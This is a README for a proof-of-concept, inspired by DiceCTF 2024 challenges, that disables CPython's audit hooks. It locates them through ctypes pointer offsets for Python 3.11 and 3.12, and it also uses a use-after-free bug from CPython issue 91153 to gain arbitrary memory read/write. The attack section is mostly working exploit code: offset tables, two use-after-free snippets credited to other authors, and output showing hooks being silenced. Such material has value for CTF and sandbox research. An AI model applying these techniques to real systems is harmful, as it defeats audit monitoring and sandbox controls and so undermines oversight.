# python audit_hooks head finder

This POC intends to show how to find the audit hook and use `ctypes` to pop it (~~SMASH it~~).

The idea is inspired by `misc/diligent-auditor` and `misc/IRS` challeneges and their solve scripts from [dicectf-quals-2024 CTF](https://github.com/dicegang/dicectf-quals-2024-challenges/).

# Ref
Diligent auditor from *organizers*: <https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/>  
IRS writeup from *Maple Bacon*: <https://maplebacon.org/2024/02/dicectf2024-irs/>

## Tested environment
```
Python 3.12.1 (main, Feb  3 2024, 17:23:12) [GCC 13.2.1 20230801] on linux
Python 3.11.7 (main, Jan 29 2024, 16:03:57) [GCC 13.2.1 20230801] on linux
```

## Offsets
```python
# Python audit hook -- under interpreter state
python_offset_311 = 0xe00
python_offset_312 = 0x41448

# native audit hook -- under runtime state
native_offset_311 = -0xe388
native_offset_312 = -0x11df0
```

## audit hook in Python
### Concept
According to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `audit_hooks` pointer under `PyInterpreterState`, we can cast `audit_hook` to `Py_ListObject` by address and pop it.

### How to use
```bash
./build.sh
./POC.py
./POC2.py
```

### Output
```bash
> ./POC.py
PyInterpreterState_addr=0x5c50c812fbe8
PyRuntimeState_addr=0x5c50c811d180
PyInterpreterState.audit_hooks_ptr_addr=0x5c50c8170fb0
PyRuntimeState.audit_hooks_ptr_addr=0x5c50c811dd78

audit_hook_ptr_offset=0x41448
1
audit hook triggered!
test audit hook -- this will trigger hook
test audit hook -- this will not
> ./POC2.py
audit hook triggered!
test audit hook -- this will trigger hook
test audit hook -- this will not
```

## audit hook in C
### Concept
According to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `audit_hooks` pointer under `PyRuntimeState`, we can directly rewrite the head of audit hooks linkList to `NULL`.

### How to use
```bash
./build.sh
./POC-native-hook.py
./POC-native-hook2.py
```
### Output
```bash
> ./POC-native.py
PyInterpreterState_addr=0x5c7801978be8
PyRuntimeState_addr=0x5c7801966180
PyInterpreterState.audit_hooks_ptr_addr=0x5c78019b9fb0
PyRuntimeState.audit_hooks_ptr_addr=0x5c7801966d78

audit_hook_ptr_offset=-0x11df0
C audit hook triggered!
test audit hook -- this will trigger hook
test audit hook -- this will not
> ./POC2-native.py
C audit hook triggered!
test audit hook -- this will trigger hook
test audit hook -- this will not
```

## Use issues/91153 to do arbitrary read/write
### Concept
By using <https://github.com/python/cpython/issues/91153>, we can overwrite audit hook without `ctypes`.
### Exploits
```python
# following arbitery reading/writing exploit code from https://github.com/python/cpython/issues/91153#issuecomment-1132117665
# by chilaxan
to_write_after_free = bytearray(bytearray.__basicsize__)
class sneaky:
    def __index__(self):
        global to_corrupt_ob_exports, to_uaf
        del to_write_after_free[:]
        to_corrupt_ob_exports = bytearray(bytearray.__basicsize__)
        to_write_after_free.__init__(bytearray.__basicsize__)
        to_uaf = memoryview(to_corrupt_ob_exports)
        return -tuple.__itemsize__

to_write_after_free[sneaky()] = 0
to_corrupt_ob_exports.clear()
occupy_uaf = bytearray()

view_backing = to_uaf.cast('P')
view = occupy_uaf

view_backing[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
memory = memoryview(view)
# end of arbitery writing exploit code

memory[<ADDR>] = <HEX>
```

```python
# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# wrote and improved by Maple Bacon CTF Team
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

memory[<ADDR>] = <HEX>
```
### How to use
```bash
./build.sh
./POC2-issue91153.py
./POC2-issue91153-native.py
```
### Output
```bash
> ./POC2-issue91153.py
audit hook triggered!
test audit hook -- this will trigger hook
test audit hook -- this will not
> ./POC2-issue91153-native.py
C audit hook triggered!
test audit hook -- this will trigger hook
test audit hook -- this will not
```

## TODO
- [x] Use <https://github.com/python/cpython/issues/91153> to smash it without `ctypes`
- [ ] Find a way to get the `audit_hook` address without using `ctypes`
